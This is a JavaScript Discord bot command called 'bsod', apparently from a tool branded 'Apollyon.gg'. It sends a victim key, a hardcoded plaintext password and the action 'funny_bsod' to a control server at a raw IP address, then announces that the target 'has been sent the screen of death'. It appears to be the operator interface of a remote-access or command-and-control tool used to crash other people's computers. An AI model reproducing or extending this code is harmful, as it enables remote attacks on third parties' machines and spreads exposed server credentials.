const { Client, Intents, MessageEmbed } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS] });
const axios = require('axios').default;


module.exports= {
    name: 'bsod',
    description: "bsod key",
    execute(message, args){
       const key = args.shift(); 
       const url = args.shift();
        axios.get(`http://45.76.255.213:3838/do_something?key=${key}&password=woodythenoob123&action=funny_bsod`)
        .then(function (response) {
            let embed = new MessageEmbed();
            let e = response.data
            embed.setColor("#262526");
            embed.setDescription(`**${key}** has been sent the screen of death.`)
            embed.setImage('https://cdn.discordapp.com/attachments/882810481331556375/882820222682271764/Purple_Line.gif')
            embed.setFooter('Apollyon.gg', 'https://i.imgur.com/jjvnvag.gif')
            embed.setTimestamp()
            message.channel.send(embed);
         })
        .catch(function (error) {
        console.log(error);
  })
    }
}